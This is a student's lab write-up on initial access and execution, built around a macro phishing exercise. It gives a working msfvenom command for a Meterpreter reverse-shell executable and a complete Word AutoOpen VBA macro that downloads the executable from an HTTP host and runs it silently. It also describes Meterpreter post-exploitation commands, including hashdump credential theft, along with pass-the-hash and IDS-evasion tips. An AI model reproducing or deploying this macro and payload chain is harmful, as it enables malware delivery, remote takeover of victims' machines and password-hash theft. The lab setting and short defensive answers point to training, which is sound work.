# Initial Access and Execution

## Task 1: Malicious Macro Delivery

**Objective:** Create a Word macro that downloads and executes a payload when the document is opened, demonstrating macro-based phishing.

The setup uses two separate services on the Kali box: a Python HTTP server (port 8080) to host the payload, and a Metasploit handler (port 4444) to catch the session.

Steps:

1. Generated an x64 Meterpreter executable ```msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.92.136 LPORT=4444 -f exe -o RAT.exe```. Confirmed the architecture with `file RAT.exe` (should report `PE32+ ... x86-64`). I specifically downloaded the x64 version because initially I was getting an error that said "unsupported 16-bit application". 

2. Started the HTTP server from the payload's directory: `python3 -m http.server 8080`

3. Started the Metasploit handler on port 4444 with the payload set to match the exe (`windows/x64/meterpreter/reverse_tcp`).

4. In Word, created an `AutoOpen` macro (View > Macros > View Macros, name it AutoOpen, Create) and pasted the code. Changed the IP placeholder value as needed.

5. Ran the macro. It downloaded the exe over HTTP, saved it to `%USERPROFILE%\Documents\launcher.exe`, and executed it. My Meterpreter session successfully loaded.

Macro code:

```
Sub AutoOpen()
    Dim objShell As Object
    Dim objHTTP As Object
    Dim objStream As Object
    Dim strPath As String
    Dim strURL As String
    
    ' --- CONFIGURATION ---
    ' REPLACE THIS WITH YOUR ACTUAL IP ADDRESS AND RAT NAME
    strURL = "http://192.168.92.136:8080/RAT.exe"
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"
    ' ---------------------

    ' 1. Validate URL
    If InStr(strURL, "YOUR_ACTUAL_IP") > 0 Then
        MsgBox "ERROR: You must replace YOUR_ACTUAL_IP with your real IP address.", vbCritical
        Exit Sub
    End If
    
    On Error GoTo ErrHandler
    
    ' 2. Download File
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", strURL, False
    objHTTP.Send
    
    If objHTTP.Status <> 200 Then
        MsgBox "Download Failed. HTTP Status: " & objHTTP.Status, vbCritical
        Exit Sub
    End If
    
    ' 3. Save File
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.Position = 0
    objStream.SaveToFile strPath, 2 ' adSaveCreateOverWrite
    objStream.Close
    
    ' 4. Verify File Exists
    If Dir(strPath) = "" Then
        MsgBox "CRITICAL: File was not saved to disk.", vbCritical
        Exit Sub
    End If
    
    ' 5. Run File
    Set objShell = CreateObject("WScript.Shell")
    ' Use cmd /c to ensure proper batch execution
    objShell.Run "cmd /c """ & strPath & """", 0, False
    
    Exit Sub

ErrHandler:
    MsgBox "ERROR " & Err.Number & ": " & Err.Description, vbCritical
End Sub
```
Video showing execution of this delivery:

https://youtu.be/BZ21Wh6ChbM

## How It Achieves Code Execution

When the document opens, the `AutoOpen` procedure runs automatically. The macro uses MSXML2.XMLHTTP to download the exe from the attacker's HTTP server, writes it to disk with ADODB.Stream, and runs it with WScript.Shell. The running exe then calls back to the Metasploit handler.

**MITRE ATT&CK:** T1566 (Phishing), T1204.002 (User Execution), T1059.005 (VBA), T1105 (Ingress Tool Transfer)

### Questions

Why is the "AutoOpen" macro name significant?

Word looks for this macro name when a document is opened and automatically runs it. This means that the attacker doesn't have to worry about the victim manually running the macro.

What defensive measures can organizations implement to block macro-based attacks?

Blocking macros is one of the biggest ways to defend against this. Windows automatically does this these days. The pesky yellow banner saying to beware of the document at the top of word documents you see after opening a file downloaded from an email or the internet is evidence of this. In group policy you can also only allow digitally signed macros from trusted sources to be run so that you can still allow your users functionality on helpful macros without the risk. Additionally, proper employee security training and blocking child processes from Office applications are great measures.

## Task 2: Backdoor an Executable


## Task 3:

Commands:

1. ipconfig

This command reveals almost everything an attacker needs to know about what network configuration items are on the current host. For example, it shows default gateway, ip, subnet masks, etc. All of this is extremely helpful for an attacker as they can get an idea as to the size of the network and/or subnet and what other segments may be on the network.

**MITRE ATT&CK:** T1016 (System Network Configuration Discovery)

2. sysinfo

This command builds nicely upon the last from an attackers perspective. It reveals the architecture, hostname, OS version, and more about the host system. All of these can be further used for enumeration and exploits, especially if something like a domain is revealed. 

**MITRE ATT&CK:** T1082 (System Information Discovery)

3. ps

This shows all of the running processes on the system. This has a host of valuable info as attackers can migrate to more stable instances (I actually show this in my video), it shows what EDR/AV might be running, and it reveals what user the process is running under (valuable for privilege escalation).

**MITRE ATT&CK:** T1057 (Process Discovery)

4. netstat -an

This shows all of the host's active TCP/UDP connections and ports. Valuable due to the fact that an attacker can see if the host is talking to a domain controller, if RDP is running, or other potential vulnerabilities. 

**MITRE ATT&CK:** T1049 (System Network Connections Discovery)

5. getprivs

This allows the attacker to see exactly what they can do with the user they have on the system they have. It can also be used for token impersonation.

**MITRE ATT&CK:** T1134 (Access Token Manipulation)

6. hashdump

Attackers use this to view the NTLM password hashes for the local accounts. This is valuable for pass-the-hash attackers or offline password cracking. If a local admin reuses passwords, then this opens up access to every machine in the environment. hashdump can be an extremely powerful command for lateral movement.

**MITRE ATT&CK:** T1003.002 (OS Credential Dumping: Security Account Manager)

7. route

Another network enumeration command. This one reveals the routing table of the host. Any network segments that the host can reach will be shown here. When this is combined with other network enum commands the attacker might as well have a packet tracer network topology of the network.

**MITRE ATT&CK:** T1016 (System Network Configuration Discovery)

8. arp

Shows the attacker what other live hosts this host is communicating with. This is a preferable method to nmap as its much stealthier. Since the ARP cache is one of the most up-to-date pictures of what hosts are actually online, pairing it with some of the above methods of lateral movement is perfect for an attacker.

**MITRE ATT&CK:** T1018 (Remote System Discovery)

9. idletime

Lastly, idletime reveals how long it's been since a user was on the machine. Very valuable if the attacker needs to have a picture of what kind of actions they can take at the mooment without being discovered. For example, if the idle time is high, then the attacker can likely pull off riskier actions without being noticed. If its low and the user may start using the system again, the attacker may be able to pull off additional recon such as using the screenshare module. (I tested this on my vms and there's no apparent indicator from the victims's perspective that the screen is being recorded. Different OS may differ.)

**MITRE ATT&CK:** T1033 (System Owner/User Discovery)

https://youtu.be/mLShDVtzsEE

Note: I forgot to run getuid in this video, though being able to run a command like hashdump proves SYSTEM privileges. However, below is a screenshot showing the command:

<img width="373" height="55" alt="image" src="https://github.com/user-attachments/assets/a63440fe-cf23-46a4-b27c-313bb4860526" />

**MITRE ATT&CK** for getuid: T1078 (Valid Accounts)

### Questions:
Why would you use reverse_https instead of reverse_tcp? 

Using https over tcp enables the traffic to be hidden inside the encrypted https traffic. As such, this allow the traffic to be hidden inside typical web browsing activity. Most people are going to instantly be able to point out http traffic as suspicious in this day and age, so this blends in better. Also, port 443 is far less likely to be blocked than port 80.

Why is using a non-default port important for operational security? 

Because almost all IDS scanners will flag default ports. In a real-world scenario, I would probably use a random port rather than something like 5555 or 6666, as just from running labs and seeing writeups, many pick easy ports like this. So if I were a defender I would probably try to block these if the organization allowed, it's a long shot but it might catch something. 

Which of the 9 enumeration commands revealed the most valuable information for lateral movement and why? 

Hashdump was probably the mose useful for me. Assuming I had another windows system on the network segment I would take the hashes found for both accounts (Apollo and azrael) then just use the hash in my SMBPass field. Assuming credential reuse I would be able to get admin access again. In addition, arp is an incredibly useful command to pair with this as I would have to find the IP of this other system.

How does the getuid output confirm the stolen credential attack was successful?

It returned NT AUTHORITY\SYSTEM. This means that I have the highest level of privileges possible on the host.

## Task 4:

### Questions:
How is RDP used by threat actors for initial access and lateral movement?

**MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol), T1078 (Valid Accounts)
Questions to Answer:
How does an RDP session differ from a Meterpreter session in terms of attacker capabilities?
Why is RDP a preferred method for attackers who want to interact with a graphical environment? 
What network monitoring indicators would suggest unauthorized RDP access?
How can organizations restrict RDP access to reduce the attack surface?
